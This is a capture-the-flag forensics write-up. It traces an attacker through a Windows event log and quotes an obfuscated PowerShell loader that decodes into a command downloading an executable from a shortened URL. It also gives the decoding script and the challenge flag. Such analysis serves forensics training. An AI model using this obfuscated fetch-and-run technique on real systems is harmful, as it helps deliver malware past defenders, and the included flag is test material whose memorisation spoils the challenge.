## HE DID WHAT?!

![ảnh](https://github.com/user-attachments/assets/156e1613-cf64-4746-a699-744bc06e0f47)

### Windows Forensics

* file: Challenge.evtx

### Overall

* After attacker connected to our server, he want to extract some data, but it was encrypted

### Solution

* Filter verbose event
* Following the timeline, there are 5 events with ID 4104 (Execute a Remote Command)

![ảnh](https://github.com/user-attachments/assets/9690993c-acff-46b9-9336-3b76c052dcb0)

```
$FBtFFDr8NXp5 = "=oQDiUGel5SYjF2YiASZslmR0V3TtASKpkiI90zZhFDbuJGc5MEZoVzQilnVIRWe5cUY6lTeMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1WoASayVVLgQ3clVXclJlYldVLlt2b25WS" ;
$w9r4pBoZlnfIzH1keCtX = $FBtFFDr8NXp5.ToCharArray() ;
[array]::Reverse($w9r4pBoZlnfIzH1keCtX) ;
-join $w9r4pBoZlnfIzH1keCtX 2>&1> $null ;
$SCr = [SyStem.TexT.encODINg]::uTF8.GeTsTrInG([SYSteM.coNVErT]::froMBaSe64STrinG("$w9r4pBoZlnfIzH1keCtX")) ;
$uqR = "i"+"N"+"V"+"o"+"k"+"e"+"-"+"E"+"X"+"p"+"r"+"E"+"S"+"S"+"i"+"O"+"n" ;
NEW-aLIaS -naME pWN -VaLuE $uqR -FORCe ;
PWN $SCr ;
.\caca.exe "VHEEVH}x3uwcnad6u3eac3pvaj6tf"
```

* after reversing this object `$FBtFFDr8NXp5`
`Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zaG9ydHVybC5hdC9pbnl1ag=="))) -OutFile "caca.exe"`

* its download file caca.exe from the url `https://shorturl.at/inyuj` (clean virustotal check)
* reverse this caca.exe

![ảnh](https://github.com/user-attachments/assets/0ec7aba0-91ca-4d60-b2ba-3931b268a70c)

* `.\caca.exe "VHEEVH}x3uwcnad6u3eac3pvaj6tf"`
* code to get original the strings

```
encoded_text = "VHEEVH}x3uwcnad6u3eac3pvaj6tf"
flag=""
for i in encoded_text:
    flag+=chr(ord(i)-2)
print(flag)
```

`TFCCTF{v1sual_b4s1c_a1nt_h4rd}`
